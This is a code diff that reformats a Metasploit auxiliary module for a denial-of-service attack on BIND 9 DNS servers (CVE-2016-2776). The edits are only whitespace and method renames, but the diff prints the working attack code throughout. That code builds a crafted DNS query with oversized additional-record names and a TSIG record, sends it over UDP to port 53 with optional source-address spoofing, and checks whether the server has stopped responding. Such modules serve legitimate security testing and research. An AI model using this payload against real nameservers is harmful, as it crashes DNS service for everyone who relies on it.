@@ -8,12 +8,12 @@ require 'timeout'
 require 'socket'
 
 class MetasploitModule < Msf::Auxiliary
-  
+
   include Msf::Exploit::Capture
   include Msf::Auxiliary::UDPScanner
   include Msf::Auxiliary::Dos
   include Msf::Auxiliary::Report
-  
+
   def initialize(info={})
     super(update_info(info,
       'Name'        => 'BIND 9 DoS CVE-2016-2776',
@@ -21,13 +21,13 @@ class MetasploitModule < Msf::Auxiliary
           Denial of Service Bind 9 DNS Server CVE-2016-2776.
           Critical error condition which can occur when a nameserver is constructing a response.
           A defect in the rendering of messages into packets can cause named to exit with an
-          assertion failure in buffer.c while constructing a response to a query that meets certain criteria.    
-          
-          This assertion can be triggered even if the apparent source address isnt allowed 
+          assertion failure in buffer.c while constructing a response to a query that meets certain criteria.
+
+          This assertion can be triggered even if the apparent source address isnt allowed
           to make queries.
       },
       # Research and Original PoC - msf module author
-      'Author'      => [ 'Martin Rocha', 'Ezequiel Tavella', 'Alejandro Parodi', 'Infobyte Research Team'], 
+      'Author'      => [ 'Martin Rocha', 'Ezequiel Tavella', 'Alejandro Parodi', 'Infobyte Research Team'],
       'License'     => MSF_LICENSE,
       'References'      =>
         [
@@ -42,22 +42,22 @@ class MetasploitModule < Msf::Auxiliary
       Opt::RPORT(53),
       OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])
     ])
-  
+
     deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
   end
 
-  def checkServerStatus(ip, rport)
-  	res = ""
-  	sudp = UDPSocket.new
-	  sudp.send(validQuery, 0, ip, rport)
-	  begin 
-		  Timeout.timeout(5) do
-	    res = sudp.recv(100)
-	  end
-	  rescue Timeout::Error
-	  end
+  def check_server_status(ip, rport)
+    res = ""
+    sudp = UDPSocket.new
+    sudp.send(valid_query, 0, ip, rport)
+    begin
+      Timeout.timeout(5) do
+      res = sudp.recv(100)
+    end
+    rescue Timeout::Error
+    end
 
-	  if(res.length==0)
+    if(res.length==0)
       print_good("Exploit Success (Maybe, nameserver did not replied)")
       else
         print_error("Exploit Failed")
@@ -65,16 +65,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def scan_host(ip)
-  	@flag_success = true
-  	print_status("Sending bombita (Specially crafted udp packet) to: "+ip)
-  	scanner_send(payload, ip, rport)
-  	checkServerStatus(ip, rport)
+    @flag_success = true
+    print_status("Sending bombita (Specially crafted udp packet) to: "+ip)
+    scanner_send(payload, ip, rport)
+    check_server_status(ip, rport)
   end
 
-  def getDomain
-  	domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
-  	org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
-  	getDomain = domain+org
+  def get_domain
+    domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
+    org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
+    get_domain = domain+org
   end
 
   def payload
@@ -86,15 +86,15 @@ class MetasploitModule < Msf::Auxiliary
     query += "\x00\x01"  # Additional RRs: 1
 
     # Doman Name
-    query += getDomain   # Random DNS Name
+    query += get_domain   # Random DNS Name
     query += "\x00"      # [End of name]
     query += "\x00\x01"  # Type: A (Host Address) (1)
     query += "\x00\x01"  # Class: IN (0x0001)
-    
+
     # Aditional records. Name
     query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes
     query += "\x3d"+Rex::Text.rand_text_alphanumeric(61)
-	  query += "\x00"
+    query += "\x00"
 
     query += "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
     query += "\x00\xff" # Class: ANY (0x00ff)
@@ -116,8 +116,8 @@ class MetasploitModule < Msf::Auxiliary
     query += "\x00\x00" # Other len: 0
   end
 
-  def validQuery
-  	query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
+  def valid_query
+    query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
     query += "\x00\x00"  # Flags: 0x0000 Standard query
     query += "\x00\x01"  # Questions: 1
     query += "\x00\x00"  # Answer RRs: 0
@@ -125,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
     query += "\x00\x00"  # Additional RRs: 0
 
     # Doman Name
-    query += getDomain   # Random DNS Name
+    query += get_domain   # Random DNS Name
     query += "\x00"      # [End of name]
     query += "\x00\x01"  # Type: A (Host Address) (1)
     query += "\x00\x01"  # Class: IN (0x0001)s
